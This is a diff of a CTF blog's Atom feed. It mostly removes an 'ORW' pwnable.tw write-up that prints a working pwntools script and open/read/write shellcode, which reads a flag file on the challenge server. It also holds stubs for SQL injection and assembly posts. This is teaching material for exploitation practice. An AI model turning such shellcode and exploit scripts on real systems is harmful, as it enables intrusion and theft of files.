+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Hope you liked the pwn training 1. More training writeups coming soon ! :D&lt;/p&gt;</content><author><name>tourpran</name></author><category term="pwn-training" /><category term="ret2shellcode" /><category term="ret2win" /><summary type="html">Introduction:</summary></entry><entry><title type="html">SQL Injection</title><link href="http://localhost:4000/blogs/2021/03/27/sqlinjection.html" rel="alternate" type="text/html" title="SQL Injection" /><published>2021-03-27T00:00:00+05:30</published><updated>2021-03-27T00:00:00+05:30</updated><id>http://localhost:4000/blogs/2021/03/27/sqlinjection</id><content type="html" xml:base="http://localhost:4000/blogs/2021/03/27/sqlinjection.html">&lt;h3 id=&quot;what-is-a-database&quot;&gt;What is a Database:&lt;/h3&gt;
 &lt;p&gt;A database can be thought as a collection of data in an organised manner. When companies have huge amounts of data to be stored, using databases is the key for efficient usage of the data.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/images/databasepic.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
@@ -557,121 +757,4 @@ so on…&lt;/li&gt;
 &lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/BrfAbLYc1PA&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;</content><author><name>tourpran</name></author><category term="YouTube" /><category term="YouTube" /><summary type="html">Description: This video I have explained the process of Reversing the binaries and to analyse the assembly which makes up the binary.</summary></entry><entry><title type="html">Introduction to Assembly Programming - 00</title><link href="http://localhost:4000/youtube/2020/07/28/introduction.html" rel="alternate" type="text/html" title="Introduction to Assembly Programming - 00" /><published>2020-07-28T00:00:00+05:30</published><updated>2020-07-28T00:00:00+05:30</updated><id>http://localhost:4000/youtube/2020/07/28/introduction</id><content type="html" xml:base="http://localhost:4000/youtube/2020/07/28/introduction.html">&lt;h2 id=&quot;description&quot;&gt;Description:&lt;/h2&gt;
 &lt;p&gt;This is the First video in a series called &lt;a href=&quot;https://www.youtube.com/watch?v=R-PxxdB7ISo&amp;amp;list=PL7cHg6AXcMXDaS3A8dk1e8uGtpdv59at8&amp;amp;ab_channel=tourpran&quot;&gt;binary Exploitation and Reverse Engineering&lt;/a&gt;. Here I talked about the Essence of Assembly Programming.&lt;/p&gt;
 
-&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/R-PxxdB7ISo&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;</content><author><name>tourpran</name></author><category term="YouTube" /><category term="YouTube" /><summary type="html">Description: This is the First video in a series called binary Exploitation and Reverse Engineering. Here I talked about the Essence of Assembly Programming.</summary></entry><entry><title type="html">ORW - pwnable.tw</title><link href="http://localhost:4000/writeup/2020/04/30/pwnabletw2.html" rel="alternate" type="text/html" title="ORW - pwnable.tw" /><published>2020-04-30T00:00:00+05:30</published><updated>2020-04-30T00:00:00+05:30</updated><id>http://localhost:4000/writeup/2020/04/30/pwnabletw2</id><content type="html" xml:base="http://localhost:4000/writeup/2020/04/30/pwnabletw2.html">&lt;blockquote&gt;
-  &lt;p&gt;Hey guys, this is a pretty awesome challenge !! Here we will be writing assembly and then we will give it to the program(binary)&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/pwnabletw2/pwnable1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;solution&quot;&gt;Solution:&lt;/h3&gt;
-
-&lt;p&gt;First I check the mitigations :&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/pwnabletw2/pwnable2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;We have NX disabled. That means it is something to do with the shellcode.&lt;/li&gt;
-  &lt;li&gt;Seems like there is a canary which will not allow you to do a stack based buffer overflows.&lt;/li&gt;
-  &lt;li&gt;there is no pie so the address of the binary will be same every time you run.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Let’s see the disassembly of this program
-&lt;img src=&quot;/assets/images/pwnabletw2/pwnable.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Here we can see that our input is being put in the address &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x804a060&lt;/code&gt; and then it is moved to EAX and then after that EAX is called.
-Meaning: our input is being executed. Now, let us run the binary and see what is happening :&amp;gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/pwnabletw2/pwnable3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Hmm… We get a segfault.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h4 id=&quot;idea&quot;&gt;Idea:&lt;/h4&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;As said in the question we will you three syscalls and then get the flag&lt;/li&gt;
-  &lt;li&gt;First call: open the flag file&lt;/li&gt;
-  &lt;li&gt;Second call: read the file&lt;/li&gt;
-  &lt;li&gt;Third call: write it to the output&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;exploit&quot;&gt;Exploit:&lt;/h4&gt;
-
-&lt;p&gt;We will see the exploit in parts.&lt;/p&gt;
-
-&lt;h4 id=&quot;part-1&quot;&gt;Part 1&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/pwnabletw2/pwnable4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;We make EAX to 5&lt;/li&gt;
-  &lt;li&gt;we push the string “///home/orw/flag”&lt;/li&gt;
-  &lt;li&gt;We make EBX pointing to the stack ( the string )&lt;/li&gt;
-  &lt;li&gt;We make EDX equal to 0 and then we make the syscall.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;part-2&quot;&gt;Part 2&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/pwnabletw2/pwnable5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;We make EAX equal to 3&lt;/li&gt;
-  &lt;li&gt;We make ECX point to the string&lt;/li&gt;
-  &lt;li&gt;Give EDX the buffer size&lt;/li&gt;
-  &lt;li&gt;Call the syscall&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;part-3&quot;&gt;Part 3&lt;/h4&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/pwnabletw2/pwnable6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;We make EAX equal to 4&lt;/li&gt;
-  &lt;li&gt;Make EBX equal to 0&lt;/li&gt;
-  &lt;li&gt;Add 1 to EBX / making EBX equal to 1. Then call the syscall.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Refer to the below image if having any doubts !!&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/pwnabletw2/pwnable7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;If we put all of the things together, then we get the flag.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/pwnabletw2/pwnable8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-py highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'chall.pwnable.tw'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10001&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;xor eax, eax&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;push eax&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;add eax, 5&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;push 0x67616c66&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;push 0x2f77726f&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;push 0x2f656d6f&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;push 0x682f2f2f&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mov ebx, esp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mov edx, 0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;int 0x80&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mov eax, 3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mov ecx, ebx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mov ebx, 3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mov edx, 40&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;int 0x80&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mov eax, 4&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;mov ebx, 0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;inc ebx&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;asm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;int 0x80&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;f&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;f&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
-
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;I hope you liked the write-up. More writeups on its way.&lt;/p&gt;
-&lt;/blockquote&gt;</content><author><name>tourpran</name></author><category term="writeup" /><category term="pwnable.tw" /><summary type="html">Hey guys, this is a pretty awesome challenge !! Here we will be writing assembly and then we will give it to the program(binary)</summary></entry></feed>
+&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/R-PxxdB7ISo&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;</content><author><name>tourpran</name></author><category term="YouTube" /><category term="YouTube" /><summary type="html">Description: This is the First video in a series called binary Exploitation and Reverse Engineering. Here I talked about the Essence of Assembly Programming.</summary></entry></feed>
